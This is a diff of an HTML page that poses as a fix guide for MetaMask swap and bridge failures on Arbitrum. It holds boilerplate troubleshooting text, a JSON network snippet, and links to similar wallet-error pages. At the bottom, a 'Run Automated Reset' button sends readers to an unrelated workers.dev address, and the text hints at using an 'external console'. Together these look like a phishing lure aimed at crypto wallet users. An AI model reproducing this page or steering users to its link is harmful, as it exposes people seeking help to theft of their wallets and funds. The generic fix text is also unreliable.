@@ -3,7 +3,7 @@
 <head><meta charset="UTF-8"><title>Metamask Extension Bug Swap And Bridge Fail On Arbitrum Network – Fix Guide</title>
 <style>
     body {
-        font-family: system-ui;
+        font-family: BlinkMacSystemFont;
         background: #0f111a;
         color: #ddd;
         padding: 20px;
@@ -15,7 +15,7 @@
         background: #1e1f24;
         border-radius: 24px;
         padding: 2rem;
-        box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        box-shadow: none;
     }
     pre {
         background: #0f0f12;
@@ -23,9 +23,9 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #cf6679; }
+    a { color: #ff7b2c; }
     .btn {
-        background: #00adb5;
+        background: #ff9455;
         color: #000;
         padding: 14px 36px;
         border-radius: 40px;
@@ -42,33 +42,33 @@
 <h1>Metamask Extension Bug Swap And Bridge Fail On Arbitrum Network</h1>
 <h2>Symptom</h2>
 <ul>
-<li>Users experience a failure when attempting to swap or bridge assets on the Arbitrum network using the Metamask extension, resulting in an error message indicating the swap and bridge functionality is not working as expected.</li>
+<li>Users are experiencing failures when attempting to swap and bridge assets on the Arbitrum network using the Metamask extension, resulting in failed transactions and potential loss of funds.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The error occurs due to a compatibility issue between the Metamask extension and the Arbitrum network, potentially caused by outdated extension versions, incorrect network configuration, or issues with the bridge protocol.</li>
+<li>The error occurs due to a compatibility issue between the Metamask extension and the Arbitrum network, specifically with the latest protocol updates and contract deployments.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>Attempt to update the Metamask extension to the latest version to ensure compatibility with the Arbitrum network.</li>
-<li>Verify the correct network is selected in Metamask (Arbitrum) and that the bridge protocol is properly configured.</li>
-<li>Utilize the following code to manually configure the bridge protocol:</li>
+<li>Update the Metamask extension to the latest version and restart the browser</li>
+<li>Manually configure the Arbitrum network settings in Metamask to use the correct RPC endpoint and chain ID</li>
+<li>Use the following JSON configuration to override the default settings:</li>
 </ul>
 <div class="codehilite"><pre><span></span><code><span class="p">{</span>
-<span class="w">  </span><span class="nt">&quot;network&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;Arbitrum&quot;</span><span class="p">,</span>
-<span class="w">  </span><span class="nt">&quot;bridge&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;official&quot;</span><span class="p">,</span>
-<span class="w">  </span><span class="nt">&quot;rpc&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;https://arbitrum.io/rpc&quot;</span>
+<span class="w">  </span><span class="nt">&quot;chainId&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">42161</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;chainName&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;Arbitrum&quot;</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;rpcUrl&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;https://arb1.arbitrum.io/rpc&quot;</span>
 <span class="p">}</span>
 </code></pre></div>
 
-<p>Consider accessing the external console for further troubleshooting and configuration adjustments. </p>
+<p>Consider utilizing an external console for further debugging and configuration.</p>
 <h2>Prerequisites</h2>
 <ul>
-<li>Metamask extension installed and configured.</li>
-<li>Arbitrum network added to Metamask.</li>
-<li>Latest version of the bridge protocol implemented.</li>
+<li>Metamask extension installed and configured</li>
+<li>Arbitrum network added to the Metamask extension</li>
+<li>Latest version of the browser and Metamask extension</li>
 </ul>
-<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/metamask-extension-bug-perps-deposit-and-convert-musd-this-paym.html">Metamask Extension Bug Perps Deposit And Convert Musd This Payment Route Isn't Available</a></li><li><a href="./archive/2026/06/metamask-extension-bug-swaps-changing-the-destination-token-cha.html">Metamask Extension Bug Swaps Changing The Destination Token Cha</a></li><li><a href="./archive/2026/06/ethereum-blob-space-delay.html">Ethereum Blob Space Delay</a></li></ul>
+<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/metamask-extension-bug-swaps-changing-the-destination-token-cha.html">Metamask Extension Bug Swaps Changing The Destination Token Cha</a></li><li><a href="./archive/2026/06/tronlink-bandwidth-error.html">TronLink Bandwidth Error</a></li><li><a href="./archive/2026/06/metamask-extension-bug-incorrect-balance-for-aave-v3-wavax-toke.html">Metamask Extension Bug Incorrect Balance For Aave V3 Wavax Token</a></li></ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=%5D%5BUr" class="btn">🛠 Run Automated Reset</a>
 </div>
